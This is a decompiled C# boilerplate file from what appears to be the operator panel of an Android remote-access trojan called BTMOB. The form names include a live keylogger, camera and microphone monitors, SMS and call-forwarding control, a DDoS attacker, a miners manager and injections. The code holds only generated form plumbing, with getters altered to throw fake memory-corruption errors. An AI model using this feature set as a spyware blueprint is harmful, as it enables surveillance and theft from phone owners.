using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.ComponentModel;
using System.ComponentModel.Design;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;

namespace BTMOB.My;

[StandardModule]
[HideModuleName]
[GeneratedCode("MyTemplate", "11.0.0.0")]
internal sealed class MyProject
{
	[EditorBrowsable(EditorBrowsableState.Never)]
	[MyGroupCollection("System.Windows.Forms.Form", "Create__Instance__", "Dispose__Instance__", "My.MyProject.Forms")]
	internal sealed class MyForms
	{
		[ThreadStatic]
		private static Hashtable m_FormBeingCreated;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public AndroidViewer m_AndroidViewer;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public apkinstaller m_apkinstaller;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public AppsManager m_AppsManager;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public basestyle m_basestyle;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Blocker m_Blocker;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public blockstyle m_blockstyle;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public BotsManager m_BotsManager;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public BTBroadcast m_BTBroadcast;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public btNotes m_btNotes;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public callforwarding m_callforwarding;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public callslogs m_callslogs;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public CameraMonitor m_CameraMonitor;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Clientsupdater m_Clientsupdater;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Clipboard m_Clipboard;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public ContactsManager m_ContactsManager;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public ddosattacker m_ddosattacker;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public downloader m_downloader;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public filesmanager m_filesmanager;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Form1 m_Form1;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public frmAlert m_frmAlert;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public ijectionlab m_ijectionlab;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public injections m_injections;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public jectormaker m_jectormaker;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public LiveKeylogger m_LiveKeylogger;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public LocationMap m_LocationMap;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public lockscreen m_lockscreen;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public MicMonitor m_MicMonitor;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public minersmanager m_minersmanager;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public myinputs m_myinputs;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public MyMsgBox m_MyMsgBox;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public phonecaller m_phonecaller;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public profile m_profile;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Redirector m_Redirector;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public remotetool m_remotetool;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public ScreenMonitor m_ScreenMonitor;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public ScreenReader m_ScreenReader;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Securekey m_Securekey;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public SMSmaker m_SMSmaker;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public SmsManager m_SmsManager;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public terminal m_terminal;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public Tracker m_Tracker;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public ttsform m_ttsform;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public updatewindow m_updatewindow;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public UploadApp m_UploadApp;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public uploader m_uploader;

		[EditorBrowsable(EditorBrowsableState.Never)]
		public WebBrowser m_WebBrowser;

		public AndroidViewer AndroidViewer
		{
			[DebuggerHidden]
			get
			{
				m_AndroidViewer = Create__Instance__(m_AndroidViewer);
				return m_AndroidViewer;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_AndroidViewer)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_AndroidViewer);
				}
			}
		}

		public apkinstaller apkinstaller
		{
			[DebuggerHidden]
			get
			{
				m_apkinstaller = Create__Instance__(m_apkinstaller);
				return m_apkinstaller;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_apkinstaller)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_apkinstaller);
				}
			}
		}

		public AppsManager AppsManager
		{
			[DebuggerHidden]
			get
			{
				m_AppsManager = Create__Instance__(m_AppsManager);
				return m_AppsManager;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_AppsManager)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_AppsManager);
				}
			}
		}

		public basestyle basestyle
		{
			[DebuggerHidden]
			get
			{
				m_basestyle = Create__Instance__(m_basestyle);
				return m_basestyle;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_basestyle)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_basestyle);
				}
			}
		}

		public Blocker Blocker
		{
			[DebuggerHidden]
			get
			{
				m_Blocker = Create__Instance__(m_Blocker);
				return m_Blocker;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Blocker)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_Blocker);
				}
			}
		}

		public blockstyle blockstyle
		{
			[DebuggerHidden]
			get
			{
				m_blockstyle = Create__Instance__(m_blockstyle);
				return m_blockstyle;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_blockstyle)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_blockstyle);
				}
			}
		}

		public BotsManager BotsManager
		{
			[DebuggerHidden]
			get
			{
				m_BotsManager = Create__Instance__(m_BotsManager);
				return m_BotsManager;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_BotsManager)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_BotsManager);
				}
			}
		}

		public BTBroadcast BTBroadcast
		{
			[DebuggerHidden]
			get
			{
				m_BTBroadcast = Create__Instance__(m_BTBroadcast);
				return m_BTBroadcast;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_BTBroadcast)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_BTBroadcast);
				}
			}
		}

		public btNotes btNotes
		{
			[DebuggerHidden]
			get
			{
				m_btNotes = Create__Instance__(m_btNotes);
				return m_btNotes;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_btNotes)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_btNotes);
				}
			}
		}

		public callforwarding callforwarding
		{
			[DebuggerHidden]
			get
			{
				m_callforwarding = Create__Instance__(m_callforwarding);
				return m_callforwarding;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_callforwarding)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_callforwarding);
				}
			}
		}

		public callslogs callslogs
		{
			[DebuggerHidden]
			get
			{
				m_callslogs = Create__Instance__(m_callslogs);
				return m_callslogs;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_callslogs)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_callslogs);
				}
			}
		}

		public CameraMonitor CameraMonitor
		{
			[DebuggerHidden]
			get
			{
				m_CameraMonitor = Create__Instance__(m_CameraMonitor);
				return m_CameraMonitor;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_CameraMonitor)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_CameraMonitor);
				}
			}
		}

		public Clientsupdater Clientsupdater
		{
			[DebuggerHidden]
			get
			{
				m_Clientsupdater = Create__Instance__(m_Clientsupdater);
				return m_Clientsupdater;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Clientsupdater)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_Clientsupdater);
				}
			}
		}

		public Clipboard Clipboard
		{
			[DebuggerHidden]
			get
			{
				m_Clipboard = Create__Instance__(m_Clipboard);
				return m_Clipboard;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Clipboard)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_Clipboard);
				}
			}
		}

		public ContactsManager ContactsManager
		{
			[DebuggerHidden]
			get
			{
				m_ContactsManager = Create__Instance__(m_ContactsManager);
				return m_ContactsManager;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_ContactsManager)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_ContactsManager);
				}
			}
		}

		public ddosattacker ddosattacker
		{
			[DebuggerHidden]
			get
			{
				m_ddosattacker = Create__Instance__(m_ddosattacker);
				return m_ddosattacker;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_ddosattacker)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_ddosattacker);
				}
			}
		}

		public downloader downloader
		{
			[DebuggerHidden]
			get
			{
				m_downloader = Create__Instance__(m_downloader);
				return m_downloader;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_downloader)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_downloader);
				}
			}
		}

		public filesmanager filesmanager
		{
			[DebuggerHidden]
			get
			{
				m_filesmanager = Create__Instance__(m_filesmanager);
				return m_filesmanager;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_filesmanager)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_filesmanager);
				}
			}
		}

		public Form1 Form1
		{
			[DebuggerHidden]
			get
			{
				m_Form1 = Create__Instance__(m_Form1);
				return m_Form1;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Form1)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_Form1);
				}
			}
		}

		public frmAlert frmAlert
		{
			[DebuggerHidden]
			get
			{
				m_frmAlert = Create__Instance__(m_frmAlert);
				return m_frmAlert;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_frmAlert)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_frmAlert);
				}
			}
		}

		public ijectionlab ijectionlab
		{
			[DebuggerHidden]
			get
			{
				m_ijectionlab = Create__Instance__(m_ijectionlab);
				return m_ijectionlab;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_ijectionlab)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_ijectionlab);
				}
			}
		}

		public injections injections
		{
			[DebuggerHidden]
			get
			{
				m_injections = Create__Instance__(m_injections);
				return m_injections;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_injections)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_injections);
				}
			}
		}

		public jectormaker jectormaker
		{
			[DebuggerHidden]
			get
			{
				m_jectormaker = Create__Instance__(m_jectormaker);
				return m_jectormaker;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_jectormaker)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_jectormaker);
				}
			}
		}

		public LiveKeylogger LiveKeylogger
		{
			[DebuggerHidden]
			get
			{
				m_LiveKeylogger = Create__Instance__(m_LiveKeylogger);
				return m_LiveKeylogger;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_LiveKeylogger)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_LiveKeylogger);
				}
			}
		}

		public LocationMap LocationMap
		{
			[DebuggerHidden]
			get
			{
				m_LocationMap = Create__Instance__(m_LocationMap);
				return m_LocationMap;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_LocationMap)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_LocationMap);
				}
			}
		}

		public lockscreen lockscreen
		{
			[DebuggerHidden]
			get
			{
				m_lockscreen = Create__Instance__(m_lockscreen);
				return m_lockscreen;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_lockscreen)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_lockscreen);
				}
			}
		}

		public MicMonitor MicMonitor
		{
			[DebuggerHidden]
			get
			{
				m_MicMonitor = Create__Instance__(m_MicMonitor);
				return m_MicMonitor;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_MicMonitor)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_MicMonitor);
				}
			}
		}

		public minersmanager minersmanager
		{
			[DebuggerHidden]
			get
			{
				m_minersmanager = Create__Instance__(m_minersmanager);
				return m_minersmanager;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_minersmanager)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_minersmanager);
				}
			}
		}

		public myinputs myinputs
		{
			[DebuggerHidden]
			get
			{
				m_myinputs = Create__Instance__(m_myinputs);
				return m_myinputs;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_myinputs)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_myinputs);
				}
			}
		}

		public MyMsgBox MyMsgBox
		{
			[DebuggerHidden]
			get
			{
				m_MyMsgBox = Create__Instance__(m_MyMsgBox);
				return m_MyMsgBox;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_MyMsgBox)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_MyMsgBox);
				}
			}
		}

		public phonecaller phonecaller
		{
			[DebuggerHidden]
			get
			{
				m_phonecaller = Create__Instance__(m_phonecaller);
				return m_phonecaller;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_phonecaller)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_phonecaller);
				}
			}
		}

		public profile profile
		{
			[DebuggerHidden]
			get
			{
				m_profile = Create__Instance__(m_profile);
				return m_profile;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_profile)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_profile);
				}
			}
		}

		public Redirector Redirector
		{
			[DebuggerHidden]
			get
			{
				m_Redirector = Create__Instance__(m_Redirector);
				return m_Redirector;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Redirector)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_Redirector);
				}
			}
		}

		public remotetool remotetool
		{
			[DebuggerHidden]
			get
			{
				m_remotetool = Create__Instance__(m_remotetool);
				return m_remotetool;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_remotetool)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_remotetool);
				}
			}
		}

		public ScreenMonitor ScreenMonitor
		{
			[DebuggerHidden]
			get
			{
				m_ScreenMonitor = Create__Instance__(m_ScreenMonitor);
				return m_ScreenMonitor;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_ScreenMonitor)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_ScreenMonitor);
				}
			}
		}

		public ScreenReader ScreenReader
		{
			[DebuggerHidden]
			get
			{
				m_ScreenReader = Create__Instance__(m_ScreenReader);
				return m_ScreenReader;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_ScreenReader)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_ScreenReader);
				}
			}
		}

		public Securekey Securekey
		{
			[DebuggerHidden]
			get
			{
				m_Securekey = Create__Instance__(m_Securekey);
				return m_Securekey;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Securekey)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_Securekey);
				}
			}
		}

		public SMSmaker SMSmaker
		{
			[DebuggerHidden]
			get
			{
				m_SMSmaker = Create__Instance__(m_SMSmaker);
				return m_SMSmaker;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_SMSmaker)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_SMSmaker);
				}
			}
		}

		public SmsManager SmsManager
		{
			[DebuggerHidden]
			get
			{
				m_SmsManager = Create__Instance__(m_SmsManager);
				return m_SmsManager;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_SmsManager)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_SmsManager);
				}
			}
		}

		public terminal terminal
		{
			[DebuggerHidden]
			get
			{
				m_terminal = Create__Instance__(m_terminal);
				return m_terminal;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_terminal)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_terminal);
				}
			}
		}

		public Tracker Tracker
		{
			[DebuggerHidden]
			get
			{
				m_Tracker = Create__Instance__(m_Tracker);
				return m_Tracker;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_Tracker)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_Tracker);
				}
			}
		}

		public ttsform ttsform
		{
			[DebuggerHidden]
			get
			{
				m_ttsform = Create__Instance__(m_ttsform);
				return m_ttsform;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_ttsform)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_ttsform);
				}
			}
		}

		public updatewindow updatewindow
		{
			[DebuggerHidden]
			get
			{
				m_updatewindow = Create__Instance__(m_updatewindow);
				return m_updatewindow;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_updatewindow)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_updatewindow);
				}
			}
		}

		public UploadApp UploadApp
		{
			[DebuggerHidden]
			get
			{
				m_UploadApp = Create__Instance__(m_UploadApp);
				return m_UploadApp;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_UploadApp)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_UploadApp);
				}
			}
		}

		public uploader uploader
		{
			[DebuggerHidden]
			get
			{
				m_uploader = Create__Instance__(m_uploader);
				return m_uploader;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_uploader)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_uploader);
				}
			}
		}

		public WebBrowser WebBrowser
		{
			[DebuggerHidden]
			get
			{
				m_WebBrowser = Create__Instance__(m_WebBrowser);
				return m_WebBrowser;
			}
			[DebuggerHidden]
			set
			{
				if (value != m_WebBrowser)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					Dispose__Instance__(ref m_WebBrowser);
				}
			}
		}

		[DebuggerHidden]
		private static T Create__Instance__<T>(T Instance) where T : Form, new()
		{
			if (Instance == null || Instance.IsDisposed)
			{
				if (m_FormBeingCreated != null)
				{
					if (m_FormBeingCreated.ContainsKey(typeof(T)))
					{
						throw new InvalidOperationException(Utils.GetResourceString("WinForms_RecursiveFormCreate"));
					}
				}
				else
				{
					m_FormBeingCreated = new Hashtable();
				}
				m_FormBeingCreated.Add(typeof(T), null);
				try
				{
					return new T();
				}
				catch (TargetInvocationException ex) when (((Func<bool>)delegate
				{
					// Could not convert BlockContainer to single expression
					ProjectData.SetProjectError(ex);
					return ex.InnerException != null;
				}).Invoke())
				{
					string resourceString = Utils.GetResourceString("WinForms_SeeInnerException", ex.InnerException.Message);
					throw new InvalidOperationException(resourceString, ex.InnerException);
				}
				finally
				{
					m_FormBeingCreated.Remove(typeof(T));
				}
			}
			return Instance;
		}

		[DebuggerHidden]
		private void Dispose__Instance__<T>(ref T instance) where T : Form
		{
			instance.Dispose();
			instance = null;
		}

		[DebuggerHidden]
		[EditorBrowsable(EditorBrowsableState.Never)]
		public MyForms()
		{
		}

		[EditorBrowsable(EditorBrowsableState.Never)]
		public override bool Equals(object o)
		{
			return base.Equals(RuntimeHelpers.GetObjectValue(o));
		}

		[EditorBrowsable(EditorBrowsableState.Never)]
		public override int GetHashCode()
		{
			return base.GetHashCode();
		}

		[EditorBrowsable(EditorBrowsableState.Never)]
		internal new Type GetType()
		{
			return typeof(MyForms);
		}

		[EditorBrowsable(EditorBrowsableState.Never)]
		public override string ToString()
		{
			return base.ToString();
		}
	}

	[EditorBrowsable(EditorBrowsableState.Never)]
	[MyGroupCollection("System.Web.Services.Protocols.SoapHttpClientProtocol", "Create__Instance__", "Dispose__Instance__", "")]
	internal sealed class MyWebServices
	{
		[EditorBrowsable(EditorBrowsableState.Never)]
		[DebuggerHidden]
		public override bool Equals(object o)
		{
			return base.Equals(RuntimeHelpers.GetObjectValue(o));
		}

		[EditorBrowsable(EditorBrowsableState.Never)]
		[DebuggerHidden]
		public override int GetHashCode()
		{
			return base.GetHashCode();
		}

		[EditorBrowsable(EditorBrowsableState.Never)]
		[DebuggerHidden]
		internal new Type GetType()
		{
			return typeof(MyWebServices);
		}

		[EditorBrowsable(EditorBrowsableState.Never)]
		[DebuggerHidden]
		public override string ToString()
		{
			return base.ToString();
		}

		[DebuggerHidden]
		private static T Create__Instance__<T>(T instance) where T : new()
		{
			if (instance == null)
			{
				return new T();
			}
			return instance;
		}

		[DebuggerHidden]
		private void Dispose__Instance__<T>(ref T instance)
		{
			instance = default(T);
		}

		[DebuggerHidden]
		[EditorBrowsable(EditorBrowsableState.Never)]
		public MyWebServices()
		{
		}
	}

	[EditorBrowsable(EditorBrowsableState.Never)]
	[ComVisible(false)]
	internal sealed class ThreadSafeObjectProvider<T> where T : new()
	{
		[CompilerGenerated]
		[ThreadStatic]
		private static T m_ThreadStaticValue;

		internal T GetInstance
		{
			[DebuggerHidden]
			get
			{
				if (m_ThreadStaticValue == null)
				{
					m_ThreadStaticValue = new T();
				}
				return m_ThreadStaticValue;
			}
		}

		[DebuggerHidden]
		[EditorBrowsable(EditorBrowsableState.Never)]
		public ThreadSafeObjectProvider()
		{
		}
	}

	private static readonly ThreadSafeObjectProvider<MyComputer> m_ComputerObjectProvider = new ThreadSafeObjectProvider<MyComputer>();

	private static readonly ThreadSafeObjectProvider<MyApplication> m_AppObjectProvider = new ThreadSafeObjectProvider<MyApplication>();

	private static readonly ThreadSafeObjectProvider<User> m_UserObjectProvider = new ThreadSafeObjectProvider<User>();

	private static ThreadSafeObjectProvider<MyForms> m_MyFormsObjectProvider = new ThreadSafeObjectProvider<MyForms>();

	private static readonly ThreadSafeObjectProvider<MyWebServices> m_MyWebServicesObjectProvider = new ThreadSafeObjectProvider<MyWebServices>();

	[HelpKeyword("My.Computer")]
	internal static MyComputer Computer
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		[DebuggerHidden]
		get
		{
			throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
		}
	}

	[HelpKeyword("My.Application")]
	internal static MyApplication Application
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		[DebuggerHidden]
		get
		{
			throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
		}
	}

	[HelpKeyword("My.User")]
	internal static User User
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		[DebuggerHidden]
		get
		{
			throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
		}
	}

	[HelpKeyword("My.Forms")]
	internal static MyForms Forms
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		[DebuggerHidden]
		get
		{
			throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
		}
	}

	[HelpKeyword("My.WebServices")]
	internal static MyWebServices WebServices
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		[DebuggerHidden]
		get
		{
			throw new AccessViolationException("Attempted to read or write protected memory. This is often an indication that other memory is corrupt.");
		}
	}
}
